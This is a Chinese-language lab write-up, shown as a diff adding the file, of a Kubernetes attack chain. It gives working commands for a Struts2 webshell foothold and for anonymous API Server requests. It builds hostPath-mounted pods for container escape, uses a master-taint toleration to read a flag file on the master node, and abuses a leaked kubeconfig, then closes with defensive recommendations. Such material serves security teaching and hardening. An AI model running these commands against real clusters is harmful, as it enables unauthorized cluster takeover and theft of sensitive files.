@@ -1,0 +1,222 @@
+引言
+
+随着云原生技术的普及，Kubernetes（简称K8s）已成为容器编排的事实标准。然而，容器化环境的复杂性也引入了新的攻击面。攻击者一旦突破容器边界，往往能够利用K8s自身的特性实现横向移动，甚至控制整个集群。本文将通过一个完整的实战模拟，深入探讨K8s环境下的攻击链：从Web应用漏洞入手，利用API Server未授权创建后门Pod实现容器逃逸，再借助污点（Taint）机制横向移动到Master节点，最终获取敏感信息。通过理论与实践相结合的方式，帮助安全人员理解K8s环境中的风险并制定有效的防护策略。
+
+一、Kubernetes基础与污点机制解析
+
+1.1 Node、Pod与调度
+
+Kubernetes集群由一组节点（Node）组成，节点可以是物理机或虚拟机。每个节点上运行着若干Pod，Pod是K8s中最小的部署单元，通常包含一个或多个容器（如Docker容器）。调度器（Scheduler）负责将新创建的Pod分配到合适的节点上，调度决策基于节点的资源、标签以及用户定义的约束。
+
+1.2 污点（Taint）与容忍度（Toleration）
+
+污点是节点的一种属性，用于标记节点具有某些“特殊之处”，例如专用硬件、磁盘类型或管理角色。如果一个节点设置了污点，只有那些明确声明能够容忍该污点的Pod才能被调度到该节点上。容忍度（Toleration）是Pod的一种属性，允许Pod“容忍”节点的污点，从而能够被调度到带有特定污点的节点。
+
+1.3 污点的三种效果及安全意义
+
+污点由键（key）、值（value）和效果（effect）组成。K8s定义了三种效果：
+
+· NoSchedule：新的Pod如果没有匹配的容忍度，不会被调度到该节点。已在节点上运行的Pod不受影响。
+· PreferNoSchedule：尽量不将Pod调度到该节点，但如果没有其他可用节点，仍可调度。这是一种软性限制。
+· NoExecute：不仅影响调度，还会驱逐节点上所有不匹配容忍度的已有Pod。这种效果通常用于节点故障或维护时。
+
+在安全视角下，污点可用于保护关键节点（如Master节点），防止普通Pod被调度到Master上。但若攻击者能够创建带有相应容忍度的Pod，就可以突破这一限制，将恶意Pod调度到Master节点，从而访问Master节点的敏感资源。这正是本文横向移动的关键技术点。
+
+二、实战环境搭建
+
+2.1 部署存在漏洞的Web应用
+
+首先，我们在K8s集群中部署一个存在Struts2漏洞的Web应用，作为攻击入口。
+
+```bash
+# 创建deployment，使用vulhub/struts2:2.3.28镜像
+kubectl create deployment struts --image=vulhub/struts2:2.3.28
+
+# 暴露服务，使用NodePort类型以便外部访问
+kubectl expose deploy struts --port=8080 --target-port=8080 --type=NodePort
+
+# 查看Pod和Service状态
+kubectl get pod,svc
+```
+
+假设集群有一个节点IP为192.168.0.138，Service分配的NodePort为30000左右，外部即可通过http://192.168.0.138:30000访问该Struts2应用。
+
+2.2 攻击入口：利用Struts2漏洞获取Shell
+
+使用Struts2漏洞利用工具（如Struts2-Scan等）对目标进行攻击，成功获取容器内的WebShell。通过WebShell执行命令，探察容器环境。
+
+```bash
+# 查看根目录
+ls -al /
+
+# 判断是否在容器内
+cat /proc/1/cgroup
+```
+
+如果看到类似/docker/...的路径，确认当前处于容器中。此时攻击者获得了容器内的初始立足点。
+
+三、内网横向移动之API Server未授权访问
+
+3.1 探测API Server未授权
+
+容器内通常可以访问K8s API Server（默认服务地址kubernetes.default.svc或通过环境变量）。由于API Server常暴露在6443端口且可能配置不当（如启用了匿名认证或弱授权），攻击者可以尝试直接访问。
+
+在WebShell中执行：
+
+```bash
+# 尝试访问API Server，-k忽略证书验证
+curl -k https://192.168.0.138:6443/api/v1/namespaces/default/pods
+```
+
+如果返回了Pod列表的JSON数据，说明API Server存在匿名访问权限，或者攻击者已绕过认证。这是极为危险的安全漏洞，攻击者可以直接利用API Server控制整个集群。
+
+3.2 利用CDK创建后门Pod实现宿主机逃逸
+
+为了进一步扩大战果，攻击者可以创建一个挂载了宿主机根目录的特权Pod，实现容器逃逸。这里使用CDK（Cloud Development Kit for Kubernetes）工具中的kcurl功能，或者直接上传kubectl二进制文件。
+
+首先，下载CDK并上传到WebShell（或利用wget/curl直接下载）：
+
+```bash
+wget https://github.com/cdk-team/CDK/releases/download/v1.0.0/cdk_linux_amd64
+chmod +x cdk_linux_amd64
+```
+
+然后，构造一个恶意Pod的定义，使其挂载宿主机的根目录到容器内的/host路径。
+
+```bash
+./cdk_linux_amd64 kcurl anonymous post 'https://192.168.0.138:6443/api/v1/namespaces/default/pods/' '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"test02","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.2","name":"test02","volumeMounts":[{"mountPath":"/host","name":"host"}]}],"volumes":[{"hostPath":{"path":"/","type":"Directory"},"name":"host"}]}}'
+```
+
+如果API Server未授权，该命令将直接创建一个名为test02的Pod，运行nginx容器，并挂载宿主机的根目录到/host。
+
+或者使用kubectl：
+
+```bash
+# 下载kubectl
+curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+chmod +x kubectl
+
+# 使用匿名认证创建Pod
+./kubectl --server=https://192.168.0.138:6443 --insecure-skip-tls-verify=true --username=a --password=a create -f test.yaml
+```
+
+其中test.yaml内容即为上述Pod定义。创建成功后，攻击者即可通过exec进入该容器，访问宿主机的文件系统。
+
+```bash
+./kubectl --server=https://192.168.0.138:6443 --insecure-skip-tls-verify=true --username=a --password=a exec test02 -- bash -c "ls /host"
+```
+
+若能看到宿主机根目录，说明逃逸成功。至此，攻击者已从容器内突破到宿主机文件系统层面。
+
+四、利用污点Taint横向移动到Master节点
+
+4.1 查看节点污点信息
+
+攻击者现在可以通过kubectl查看集群节点信息，寻找关键节点如Master。Master节点通常带有污点以防止普通Pod调度。
+
+```bash
+# 查看所有节点
+./kubectl --server=https://192.168.0.138:6443 --insecure-skip-tls-verify=true --username=a --password=a get nodes
+
+# 查看Master节点详情，重点关注Taints字段
+./kubectl --server=https://192.168.0.138:6443 --insecure-skip-tls-verify=true --username=a --password=a describe nodes master
+```
+
+假设输出中看到：
+
+```
+Taints:             node-role.kubernetes.io/master:NoSchedule
+```
+
+表明Master节点设置了NoSchedule污点，普通Pod无法调度至此。
+
+4.2 创建带有容忍度的特权Pod挂载Master目录
+
+为了横向移动到Master节点，攻击者需要创建一个能够容忍该污点的Pod，并再次挂载宿主机的根目录。编写如下YAML：
+
+```yaml
+# x.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: control-master-x
+spec:
+  tolerations:                       # 容忍Master节点的污点
+    - key: node-role.kubernetes.io/master
+      operator: Exists
+      effect: NoSchedule
+  containers:
+    - name: control-master-x
+      image: ubuntu:18.04
+      command: ["/bin/sleep", "3650d"]   # 保持容器运行
+      volumeMounts:
+        - name: master
+          mountPath: /master
+  volumes:
+    - name: master
+      hostPath:
+        path: /                        # 挂载Master根目录
+        type: Directory
+```
+
+使用kubectl创建该Pod：
+
+```bash
+./kubectl --server=https://192.168.0.138:6443 --insecure-skip-tls-verify=true --username=a --password=a create -f x.yaml
+```
+
+由于Pod中定义了容忍度node-role.kubernetes.io/master:NoSchedule，它将被成功调度到Master节点。检查Pod运行状态：
+
+```bash
+./kubectl --server=https://192.168.0.138:6443 --insecure-skip-tls-verify=true --username=a --password=a get pods -o wide
+```
+
+如果Pod运行在Master节点上，攻击者即可进入容器访问Master的文件系统：
+
+```bash
+./kubectl --server=https://192.168.0.138:6443 --insecure-skip-tls-verify=true --username=a --password=a exec control-master-x -- bash -c "cat /master/root/flag"
+```
+
+至此，攻击者成功获取Master节点上的敏感文件，实现了从普通容器到Master节点的横向移动。
+
+五、利用Config泄漏横向移动
+
+在实际攻防中，攻击者可能通过其他方式获取到Kubeconfig配置文件（如开发者误上传、容器内挂载的ServiceAccount token等）。假设攻击者在某处找到了config文件，便可以使用该文件直接控制集群。
+
+```bash
+# 使用config文件访问API Server
+./kubectl -s https://10.96.0.1:443/ --kubeconfig=config --insecure-skip-tls-verify=true get nodes
+
+# 创建恶意Pod（类似前面的逃逸Pod）
+./kubectl apply -f test.yaml -n default --kubeconfig=config
+
+# 进入Pod操作
+./kubectl -n default --kubeconfig=config exec test02 -- bash -c "ls /mnt/root"
+```
+
+这种方式同样可以实现容器逃逸和横向移动，且可能拥有更高的权限（取决于config文件中的身份）。
+
+六、防御建议
+
+针对以上攻击路径，我们提出以下防御措施：
+
+1. 严格配置API Server认证与授权：
+   · 禁用匿名认证（--anonymous-auth=false）。
+   · 启用RBAC并遵循最小权限原则，避免过度授予权限。
+   · 使用网络策略限制对API Server的访问，仅允许必要的来源。
+2. 强化Pod安全策略：
+   · 启用Pod安全准入控制器（如Pod Security Standards），禁止特权容器和主机路径挂载。
+   · 使用OPA/Gatekeeper等策略引擎限制危险卷挂载和容忍度设置。
+3. 管理污点与容忍度：
+   · 对关键节点（如Master）设置NoSchedule污点，并严格审核带有容忍度的Pod。
+   · 定期审计集群中允许容忍关键污点的Pod，确保其合法性。
+4. 安全配置Kubeconfig文件：
+   · 加密存储Kubeconfig文件，避免明文泄露。
+   · 对ServiceAccount token进行生命周期管理，及时轮换。
+5. 定期安全扫描与漏洞管理：
+   · 及时更新容器镜像和集群组件，修复已知漏洞（如Struts2）。
+   · 使用容器安全扫描工具检测镜像中的漏洞。
+
+结语
+
+本文通过一个完整的K8s攻防场景，展示了从Web应用漏洞到容器逃逸，再到利用污点机制横向移动至Master节点的全过程。攻击者利用了API Server未授权、特权容器配置以及污点容忍度的组合，一步步扩大战果。理解这些攻击手法有助于安全团队提前加固环境，构建纵深防御体系。在云原生时代，安全不仅是边界防护，更需要深入到容器、编排层和应用层的每一个环节。
